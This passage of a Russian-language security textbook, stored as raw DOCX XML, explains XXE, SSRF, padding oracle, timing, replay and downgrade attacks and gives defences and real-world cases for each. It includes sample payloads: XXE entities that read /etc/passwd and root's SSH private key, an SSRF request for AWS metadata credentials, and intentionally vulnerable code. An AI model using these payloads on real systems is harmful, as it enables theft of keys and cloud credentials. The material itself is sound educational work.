        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>&lt;!DOCTYPE foo [</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!ENTITY greeting "Hello, World!"&gt;</w:t>
        <w:br/>
        <w:t>]&gt;</w:t>
        <w:br/>
        <w:t>&lt;message&gt;&amp;greeting;&lt;/message&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Парсер заменит `&amp;greeting;` на `"Hello, World!"`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: XML поддерживает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>внешние сущности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (чтение файлов):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>&lt;!DOCTYPE foo [</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</w:t>
        <w:br/>
        <w:t>]&gt;</w:t>
        <w:br/>
        <w:t>&lt;message&gt;&amp;xxe;&lt;/message&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Парсер </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>прочитает файл `/etc/passwd`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и вставит содержимое в XML!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атака</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>&lt;!DOCTYPE foo [</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"&gt;</w:t>
        <w:br/>
        <w:t>]&gt;</w:t>
        <w:br/>
        <w:t>&lt;credentials&gt;&amp;xxe;&lt;/credentials&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Хакер украдёт SSH-ключ root.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ещё хуже — SSRF через XXE</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>&lt;!DOCTYPE foo [</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!ENTITY xxe SYSTEM "http://internal-server/admin"&gt;</w:t>
        <w:br/>
        <w:t>]&gt;</w:t>
        <w:br/>
        <w:t>&lt;request&gt;&amp;xxe;&lt;/request&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Парсер отправит HTTP-запрос на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>внутренний сервер</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (обход firewall).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — Facebook XXE (2014)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>XXE в обработке DOCX-файлов (DOCX — это ZIP с XML внутри):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Исследователь загрузил DOCX с XXE payload</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Прочитал файлы на сервере Facebook</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Награда: **$33,500** (bug bounty)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Отключить обработку external entities**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  import xml.etree.ElementTree as ET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ET.XMLParser(resolve_entities=False)  # Отключаем внешние сущности</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использовать **безопасные парсеры** (например, `defusedxml`)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>SSRF (Server-Side Request Forgery)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Заставить сервер отправить HTTP-запрос на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>внутренний ресурс</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>внешний сервис</w:t>
      </w:r>
      <w:r>
        <w:t>, обходя firewall.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уязвимый код</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>@app.route('/fetch')</w:t>
        <w:br/>
        <w:t>def fetch_url():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    url = request.args.get('url')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    response = requests.get(url)  # ОПАСНО!</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return response.text</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атака 1 — Чтение внутренних сервисов</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>GET /fetch?url=http://localhost:8080/admin</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Сервер отправит запрос на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>внутренний admin-панель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> → хакер обойдёт firewall.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атака 2 — Чтение метаданных облака</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В AWS/GCP есть специальный URL для получения метаданных (токены доступа, ключи):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Хакер </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>украдёт AWS credentials</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> → получит доступ к S3, EC2, RDS.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — Capital One (2019)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>SSRF в веб-приложении Capital One:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер отправил запрос на метаданные AWS: `http://169.254.169.254/latest/meta-data/...`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Украл **AWS credentials** → получил доступ к S3-бакету</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Украдены данные **106 млн клиентов**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ущерб: **$80-150 млн** (штрафы, судебные издержки)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Whitelist** разрешённых доменов:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  allowed_domains = ['api.example.com', 'cdn.example.com']</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  if not any(url.startswith(f'https://{d}') for d in allowed_domains):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">      abort(403)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Блокировка приватных IP**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  import ipaddress</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  host = urlparse(url).hostname</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ip = ipaddress.ip_address(host)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  if ip.is_private or ip.is_loopback:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">      abort(403)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Блокировка метаданных облака**: `169.254.169.254`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.6.3. Криптографические атаки: Когда математика побеждает шифрование</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Padding Oracle Attack (Атака через оракул заполнения)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Атака на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CBC-режим шифрования</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, которая позволяет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>расшифровать данные</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> без знания ключа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как это работает?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В режиме CBC (Cipher Block Chaining) последний блок дополняется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>padding</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (заполнением) до нужного размера.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Если сервер возвращает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>разные ошибки</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для неправильного padding и неправильной подписи, хакер может использовать сервер как </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>«оракул»</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для расшифровки.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер изменяет зашифрованный текст</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Отправляет на сервер</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сервер отвечает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**"Invalid padding"** → padding неверный</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**"Invalid signature"** → padding верный, но подпись неверная</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Перебирая байты, хакер узнаёт padding → расшифровывает данные</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — ASP.NET (2010)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Padding Oracle в ASP.NET ViewState:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ViewState — зашифрованные данные сессии (cookies)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сервер возвращал разные ошибки для padding/signature</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер расшифровал ViewState → подделал данные → получил admin-доступ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Одинаковые сообщения об ошибках**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  try:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">      decrypt_and_verify(ciphertext)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  except:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">      return "Invalid data"  # Не раскрываем, что именно неверно</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использовать **аутентифицированное шифрование** (AES-GCM вместо AES-CBC)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Timing Attack (Атака по времени)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Определение </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>секретных данных</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> по времени выполнения операции.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример уязвимого кода</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (сравнение паролей):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def check_password(input_password, correct_password):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if len(input_password) != len(correct_password):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return False</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for i in range(len(input_password)):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if input_password[i] != correct_password[i]:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            return False  # ← Выход при первом несовпадении</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return True</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атака</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер пробует пароли: `"aaaaa"`, `"baaaa"`, `"caaaa"`, ..., `"paaaa"`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Замеряет время ответа:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`"aaaaa"` → 1 мкс (первая буква неверна, выход сразу)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`"baaaa"` → 1 мкс</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`"paaaa"` → **2 мкс** (первая буква верна, проверяется вторая!)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер узнал первую букву: **"p"**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Далее перебирает вторую букву: `"paaaa"`, `"pbaaa"`, ..., `"pasaa"` → время увеличилось → вторая буква "a"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Так по одной букве за раз вместо перебора всех комбинаций</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — OpenSSL (2003)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Timing attack на RSA:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Время вычисления RSA-подписи зависит от секретного ключа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер измерял время генерации подписей → восстановил ключ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Constant-time сравнение**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  import hmac</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  def secure_compare(a, b):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">      return hmac.compare_digest(a, b)  # Всегда проверяет ВСЕ байты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Replay Attack (Атака повтором)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Перехват </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>валидного запроса</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и его </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>повторная отправка</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Жертва отправляет: `POST /transfer { "to": "Bob", "amount": 100, "signature": "xyz" }`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер перехватывает запрос</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер отправляет тот же запрос **снова** → деньги переводятся повторно</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Nonce** (одноразовый токен):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```json</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  { "to": "Bob", "amount": 100, "nonce": "f3a8b2c1", "timestamp": 1609459200 }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  Сервер запоминает использованные nonce → отклоняет повторы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Timestamp** (временная метка):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  Сервер принимает запросы только если `|timestamp - current_time| &lt; 5 минут`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Downgrade Attack (Атака понижением)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Принуждение использовать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>слабое шифрование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> вместо сильного.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример — POODLE (2014)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Атака на SSL 3.0:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HTTPS поддерживает несколько версий: TLS 1.2, TLS 1.1, SSL 3.0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер (MITM) блокирует TLS-запросы → клиент откатывается на SSL 3.0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SSL 3.0 имеет уязвимость → хакер расшифровывает трафик</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
